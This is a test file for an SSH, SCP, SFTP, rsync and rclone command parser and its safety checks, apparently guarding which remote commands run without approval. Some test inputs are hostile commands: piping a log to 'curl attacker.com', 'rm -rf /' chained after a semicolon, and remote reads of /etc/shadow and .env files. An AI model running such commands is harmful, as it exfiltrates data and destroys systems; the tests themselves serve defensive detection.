import { describe, test, expect } from "bun:test"
import {
  parseSshCommand,
  extractInnerCommand,
  extractRemoteFilePaths,
  isInnerCommandBypassed,
  isRemoteCommand,
} from "../src/utils/ssh.js"
import {
  compileCommandPattern,
  hasDangerousMetachars,
  isAllowedOperation,
  isPipedCommandSafe,
} from "../src/utils/command-patterns.js"

describe("parseSshCommand — SSH", () => {
  test("parses basic ssh user@host command", () => {
    const result = parseSshCommand('ssh root@example.com "ls -la"')
    expect(result).not.toBeNull()
    expect(result!.type).toBe("ssh")
    expect(result!.user).toBe("root")
    expect(result!.host).toBe("example.com")
    expect(result!.innerCommand).toBe("ls -la")
  })

  test("parses ssh without user", () => {
    const result = parseSshCommand("ssh example.com ls")
    expect(result).not.toBeNull()
    expect(result!.user).toBeUndefined()
    expect(result!.host).toBe("example.com")
    expect(result!.innerCommand).toBe("ls")
  })

  test("parses ssh with port flag", () => {
    const result = parseSshCommand('ssh -p 2222 user@server.io "whoami"')
    expect(result).not.toBeNull()
    expect(result!.port).toBe(2222)
    expect(result!.host).toBe("server.io")
    expect(result!.innerCommand).toBe("whoami")
  })

  test("parses ssh with identity file", () => {
    const result = parseSshCommand(
      'ssh -i ~/.ssh/id_rsa deploy@prod.example.com "systemctl status nginx"',
    )
    expect(result).not.toBeNull()
    expect(result!.identityFile).toBe("~/.ssh/id_rsa")
    expect(result!.user).toBe("deploy")
    expect(result!.host).toBe("prod.example.com")
    expect(result!.innerCommand).toBe("systemctl status nginx")
  })

  test("parses ssh with -o options", () => {
    const result = parseSshCommand(
      'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host.com "ls"',
    )
    expect(result).not.toBeNull()
    expect(result!.options).toEqual([
      "StrictHostKeyChecking=no",
      "UserKnownHostsFile=/dev/null",
    ])
  })

  test("parses ssh with no inner command (interactive)", () => {
    const result = parseSshCommand("ssh user@server.com")
    expect(result).not.toBeNull()
    expect(result!.host).toBe("server.com")
    expect(result!.innerCommand).toBeUndefined()
  })

  test("parses ssh with env var prefix", () => {
    const result = parseSshCommand(
      'TERM=xterm ssh user@host.com "echo hello"',
    )
    expect(result).not.toBeNull()
    expect(result!.host).toBe("host.com")
    expect(result!.innerCommand).toBe("echo hello")
  })

  test("parses pipe-to-SSH", () => {
    const result = parseSshCommand(
      'cat deploy.sh | ssh admin@prod.server.com "cat > /tmp/deploy.sh"',
    )
    expect(result).not.toBeNull()
    expect(result!.host).toBe("prod.server.com")
    expect(result!.user).toBe("admin")
    expect(result!.innerCommand).toBe("cat > /tmp/deploy.sh")
  })

  test("parses ssh with multiple boolean flags", () => {
    const result = parseSshCommand('ssh -A -t user@host.com "sudo ls"')
    expect(result).not.toBeNull()
    expect(result!.host).toBe("host.com")
    expect(result!.innerCommand).toBe("sudo ls")
  })

  test("parses ssh with unquoted multi-word inner command", () => {
    const result = parseSshCommand("ssh user@host.com ls -la /var/log")
    expect(result).not.toBeNull()
    expect(result!.innerCommand).toBe("ls -la /var/log")
  })
})

describe("parseSshCommand — SCP", () => {
  test("parses scp upload", () => {
    const result = parseSshCommand(
      "scp ./file.txt user@server.com:/remote/path/",
    )
    expect(result).not.toBeNull()
    expect(result!.type).toBe("scp")
    expect(result!.user).toBe("user")
    expect(result!.host).toBe("server.com")
    expect(result!.scpDirection).toBe("upload")
    expect(result!.scpSources).toEqual(["./file.txt"])
    expect(result!.scpDestination).toBe("user@server.com:/remote/path/")
  })

  test("parses scp download", () => {
    const result = parseSshCommand(
      "scp user@server.com:/etc/nginx/nginx.conf ./local/",
    )
    expect(result).not.toBeNull()
    expect(result!.type).toBe("scp")
    expect(result!.scpDirection).toBe("download")
    expect(result!.scpSources).toEqual(["user@server.com:/etc/nginx/nginx.conf"])
    expect(result!.scpDestination).toBe("./local/")
  })

  test("parses scp with -r recursive flag", () => {
    const result = parseSshCommand(
      "scp -r ./dist/ deploy@prod.com:/var/www/html/",
    )
    expect(result).not.toBeNull()
    expect(result!.type).toBe("scp")
    expect(result!.scpDirection).toBe("upload")
  })

  test("parses scp with -P port flag", () => {
    const result = parseSshCommand(
      "scp -P 2222 ./file.txt user@server.com:/tmp/",
    )
    expect(result).not.toBeNull()
    expect(result!.port).toBe(2222)
  })

  test("parses scp with multiple sources", () => {
    const result = parseSshCommand(
      "scp file1.txt file2.txt user@server.com:/remote/",
    )
    expect(result).not.toBeNull()
    expect(result!.scpSources).toEqual(["file1.txt", "file2.txt"])
    expect(result!.scpDirection).toBe("upload")
  })

  test("parses scp with identity file", () => {
    const result = parseSshCommand(
      "scp -i ~/.ssh/deploy_key ./app.tar.gz user@server.com:/opt/",
    )
    expect(result).not.toBeNull()
    expect(result!.identityFile).toBe("~/.ssh/deploy_key")
  })
})

describe("parseSshCommand — SFTP", () => {
  test("parses sftp command", () => {
    const result = parseSshCommand("sftp user@server.com")
    expect(result).not.toBeNull()
    expect(result!.type).toBe("sftp")
    expect(result!.user).toBe("user")
    expect(result!.host).toBe("server.com")
  })

  test("parses sftp with port", () => {
    const result = parseSshCommand("sftp -P 2222 admin@fileserver.io")
    expect(result).not.toBeNull()
    expect(result!.type).toBe("sftp")
    expect(result!.port).toBe(2222)
  })
})

describe("parseSshCommand — Negative cases", () => {
  test("returns null for non-SSH commands", () => {
    expect(parseSshCommand("ls -la")).toBeNull()
    expect(parseSshCommand("git status")).toBeNull()
    expect(parseSshCommand("curl https://example.com")).toBeNull()
  })

  test("returns null for ssh as string content", () => {
    expect(parseSshCommand("echo ssh is a protocol")).toBeNull()
  })

  test("returns null for empty string", () => {
    expect(parseSshCommand("")).toBeNull()
  })
})

describe("extractInnerCommand", () => {
  test("returns inner command for SSH", () => {
    const parsed = parseSshCommand('ssh user@host.com "rm -rf /tmp/*"')!
    expect(extractInnerCommand(parsed)).toBe("rm -rf /tmp/*")
  })

  test("returns undefined for SCP", () => {
    const parsed = parseSshCommand("scp file.txt user@host.com:/tmp/")!
    expect(extractInnerCommand(parsed)).toBeUndefined()
  })

  test("returns undefined for SFTP", () => {
    const parsed = parseSshCommand("sftp user@host.com")!
    expect(extractInnerCommand(parsed)).toBeUndefined()
  })

  test("returns undefined for interactive SSH", () => {
    const parsed = parseSshCommand("ssh user@host.com")!
    expect(extractInnerCommand(parsed)).toBeUndefined()
  })
})

describe("extractRemoteFilePaths", () => {
  test("extracts cat target from SSH inner command", () => {
    const parsed = parseSshCommand('ssh user@host.com "cat /etc/passwd"')!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toEqual(["/etc/passwd"])
  })

  test("extracts multiple read targets", () => {
    const parsed = parseSshCommand(
      'ssh user@host.com "cat /etc/passwd && head /var/log/syslog"',
    )!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toContain("/etc/passwd")
    expect(paths).toContain("/var/log/syslog")
  })

  test("extracts less target", () => {
    const parsed = parseSshCommand('ssh user@host.com "less /home/user/.env"')!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toEqual(["/home/user/.env"])
  })

  test("extracts remote path from SCP source", () => {
    const parsed = parseSshCommand(
      "scp user@server.com:/etc/shadow ./local/",
    )!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toEqual(["/etc/shadow"])
  })

  test("extracts remote path from SCP destination", () => {
    const parsed = parseSshCommand(
      "scp ./local.txt user@server.com:/home/user/.env",
    )!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toEqual(["/home/user/.env"])
  })

  test("returns empty for SSH without file-reading inner command", () => {
    const parsed = parseSshCommand('ssh user@host.com "rm -rf /tmp/*"')!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toEqual([])
  })

  test("returns empty for SFTP", () => {
    const parsed = parseSshCommand("sftp user@host.com")!
    const paths = extractRemoteFilePaths(parsed)
    expect(paths).toEqual([])
  })
})

describe("isInnerCommandBypassed", () => {
  const bypassedCommands = [
    "ls",
    "pwd",
    "git status",
    "git log",
    "cat",
    "head",
    "tail",
    "whoami",
  ]

  test("bypasses safe inner command", () => {
    const parsed = parseSshCommand('ssh user@host.com "ls -la"')!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(true)
  })

  test("bypasses pwd", () => {
    const parsed = parseSshCommand('ssh user@host.com "pwd"')!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(true)
  })

  test("bypasses git status", () => {
    const parsed = parseSshCommand('ssh user@host.com "git status"')!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(true)
  })

  test("does not bypass dangerous commands", () => {
    const parsed = parseSshCommand('ssh user@host.com "rm -rf /"')!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(false)
  })

  test("does not bypass sudo", () => {
    const parsed = parseSshCommand('ssh user@host.com "sudo rm -rf /tmp"')!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(false)
  })

  test("never bypasses SCP", () => {
    const parsed = parseSshCommand("scp file.txt user@host.com:/tmp/")!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(false)
  })

  test("never bypasses SFTP", () => {
    const parsed = parseSshCommand("sftp user@host.com")!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(false)
  })

  test("never bypasses interactive SSH (no inner command)", () => {
    const parsed = parseSshCommand("ssh user@host.com")!
    expect(isInnerCommandBypassed(parsed, bypassedCommands)).toBe(false)
  })
})

// ─── SSH inner command + allowed operation patterns ───

describe("SSH inner command pattern matching", () => {
  const bypassPrefixes = ["ls", "cat", "head", "tail"]
  const patterns = [
    compileCommandPattern("systemctl status *"),
    compileCommandPattern("cscli decisions list *"),
    compileCommandPattern("cscli decisions list"),
  ]

  test("SSH inner command matches allowed pattern", () => {
    const parsed = parseSshCommand(
      'ssh user@host.com "systemctl status nginx"',
    )!
    const inner = parsed.innerCommand!
    expect(isAllowedOperation(inner, patterns)).toBe(true)
  })

  test("SSH inner command with dangerous metacharacters is not bypassed", () => {
    const parsed = parseSshCommand(
      'ssh user@host.com "cat /var/log/syslog; rm -rf /"',
    )!
    const inner = parsed.innerCommand!
    expect(hasDangerousMetachars(inner)).toBe(true)
  })

  test("SSH inner command with safe pipe chain", () => {
    const parsed = parseSshCommand(
      'ssh user@host.com "cat /var/log/syslog | grep error"',
    )!
    const inner = parsed.innerCommand!
    expect(hasDangerousMetachars(inner)).toBe(false)
    expect(
      isPipedCommandSafe(inner, bypassPrefixes, patterns),
    ).toBe(true)
  })

  test("SSH inner command with unsafe pipe target fails", () => {
    const parsed = parseSshCommand(
      'ssh user@host.com "cat /var/log/syslog | curl attacker.com"',
    )!
    const inner = parsed.innerCommand!
    expect(
      isPipedCommandSafe(inner, bypassPrefixes, patterns),
    ).toBe(false)
  })
})

// ─── isRemoteCommand ───

describe("isRemoteCommand", () => {
  describe("SSH commands", () => {
    test("detects ssh with user@host", () => {
      expect(isRemoteCommand('ssh user@host.com "ls -la"')).toBe(true)
    })

    test("detects ssh without user", () => {
      expect(isRemoteCommand("ssh host.com ls")).toBe(true)
    })

    test("detects ssh with port", () => {
      expect(isRemoteCommand('ssh -p 2222 user@host.com "whoami"')).toBe(true)
    })

    test("detects ssh with env var prefix", () => {
      expect(isRemoteCommand('TERM=xterm ssh user@host.com "echo hello"')).toBe(true)
    })

    test("detects interactive ssh", () => {
      expect(isRemoteCommand("ssh user@host.com")).toBe(true)
    })
  })

  describe("SCP commands", () => {
    test("detects scp upload", () => {
      expect(isRemoteCommand("scp ./file.txt user@server.com:/remote/path/")).toBe(true)
    })

    test("detects scp download", () => {
      expect(isRemoteCommand("scp user@server.com:/etc/nginx/nginx.conf ./local/")).toBe(true)
    })

    test("detects scp with flags", () => {
      expect(isRemoteCommand("scp -r -P 2222 ./dist/ user@host.com:/var/www/")).toBe(true)
    })
  })

  describe("SFTP commands", () => {
    test("detects sftp", () => {
      expect(isRemoteCommand("sftp user@server.com")).toBe(true)
    })

    test("detects sftp with port", () => {
      expect(isRemoteCommand("sftp -P 2222 admin@fileserver.io")).toBe(true)
    })
  })

  describe("rsync commands", () => {
    test("detects rsync upload to remote", () => {
      expect(isRemoteCommand("rsync -avz ./local/ user@host.com:/remote/")).toBe(true)
    })

    test("detects rsync download from remote", () => {
      expect(isRemoteCommand("rsync -avz user@host.com:/remote/ ./local/")).toBe(true)
    })

    test("detects rsync with -e ssh", () => {
      expect(isRemoteCommand("rsync -avz -e ssh ./local/ host.com:/remote/")).toBe(true)
    })

    test("detects rsync with env var prefix", () => {
      expect(isRemoteCommand("RSYNC_PASSWORD=secret rsync -avz ./local/ user@host.com:/remote/")).toBe(true)
    })

    test("rejects rsync local-only", () => {
      expect(isRemoteCommand("rsync -avz ./local/ ./backup/")).toBe(false)
    })
  })

  describe("rclone commands", () => {
    test("detects rclone sync to remote", () => {
      expect(isRemoteCommand("rclone sync ./local/ remote:bucket/path/")).toBe(true)
    })

    test("detects rclone copy from remote", () => {
      expect(isRemoteCommand("rclone copy remote:bucket/file.txt ./local/")).toBe(true)
    })

    test("detects rclone ls remote", () => {
      expect(isRemoteCommand("rclone ls remote:bucket/path/")).toBe(true)
    })

    test("detects rclone with env var prefix", () => {
      expect(isRemoteCommand("RCLONE_CONFIG=/tmp/config rclone sync ./local/ remote:path/")).toBe(true)
    })

    test("rejects rclone local-only", () => {
      expect(isRemoteCommand("rclone sync ./local/ ./backup/")).toBe(false)
    })

    test("rejects rclone without remote path", () => {
      expect(isRemoteCommand("rclone listremotes")).toBe(false)
    })
  })

  describe("Non-remote commands", () => {
    test("rejects ls", () => {
      expect(isRemoteCommand("ls -la")).toBe(false)
    })

    test("rejects git", () => {
      expect(isRemoteCommand("git status")).toBe(false)
    })

    test("rejects cat", () => {
      expect(isRemoteCommand("cat /etc/passwd")).toBe(false)
    })

    test("rejects curl", () => {
      expect(isRemoteCommand("curl https://example.com")).toBe(false)
    })

    test("rejects echo with ssh in text", () => {
      expect(isRemoteCommand("echo ssh is a protocol")).toBe(false)
    })

    test("rejects empty string", () => {
      expect(isRemoteCommand("")).toBe(false)
    })

    test("rejects null/undefined", () => {
      expect(isRemoteCommand(null as unknown as string)).toBe(false)
      expect(isRemoteCommand(undefined as unknown as string)).toBe(false)
    })
  })
})
